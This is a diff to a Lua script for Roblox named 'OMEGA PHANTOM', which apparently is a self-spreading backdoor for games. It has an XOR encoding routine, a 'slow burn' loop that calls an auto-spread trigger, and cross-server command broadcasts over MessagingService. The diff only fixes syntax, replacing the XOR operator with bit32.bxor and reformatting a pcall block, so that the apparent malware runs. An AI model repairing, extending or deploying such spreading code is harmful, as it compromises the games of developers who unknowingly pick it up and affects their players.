@@ -1,4 +1,4 @@
--- OMEGA PHANTOM | THE FINAL PROTOCOL (CLEAN, NO SYNTAX ERRORS) | 109er_0
+-- OMEGA PHANTOM | THE FINAL PROTOCOL (SYNTAX-FIXED) | 109er_0
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -33,7 +33,7 @@ local function xorEncode(data, key)
     for i = 1, #data do
         local charCode = string.byte(data, i)
         local keyCode = string.byte(key, (i-1) % #key + 1)
-        encoded = encoded .. string.char(charCode ~ keyCode)
+        encoded = encoded .. string.char(bit32.bxor(charCode, keyCode))
     end
     return encoded
 end
@@ -490,7 +490,9 @@ local function startSlowBurn()
         while true do
             task.wait(spreadInterval)
             if autoSpreadEnabled then autoSpreadTrigger() end
-            pcall(function() MessagingService:PublishAsync("Omega_Internal_"..game.PlaceId, HttpService:JSONEncode({cmd="global_pulse"})) end)
+            pcall(function()
+                MessagingService:PublishAsync("Omega_Internal_"..game.PlaceId, HttpService:JSONEncode({cmd="global_pulse"}))
+            end)
         end
     end)
 end
